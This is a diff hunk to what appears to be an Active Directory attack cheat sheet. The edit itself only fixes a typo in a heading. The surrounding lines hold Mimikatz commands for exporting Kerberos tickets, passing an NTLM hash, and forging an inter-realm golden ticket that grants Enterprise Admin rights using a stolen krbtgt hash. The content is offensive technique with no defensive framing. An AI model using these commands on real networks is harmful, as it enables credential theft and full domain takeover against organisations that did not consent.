@@ -31,7 +31,7 @@ Invoke-Mimikatz -Command '"kerberos::list /export"'
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlmHash>"'
 ```
 
-### Inter realm golden ticket - can be done offline, since domain controller connection is not necessary (/enind = validity period 60 minutes, /user can be fictitious, -519 is the SID of enteprise admin)
+### Inter realm golden ticket - can be done offline, since domain controller connection is not necessary (/endin = validity period 60 minutes, /user can be fictitious, -519 is the SID of enteprise admin)
 ```
 Invoke-Mimikatz -Command '"kerberos::golden /user:<attackerAccount> /domain:<compromisedDomain> /sid:<sidCompromisedDomain> /sids:<sidTargetDomain>-519 /krbtgt:<ntlmHashKrbTgt> /endin:60"'
 ```
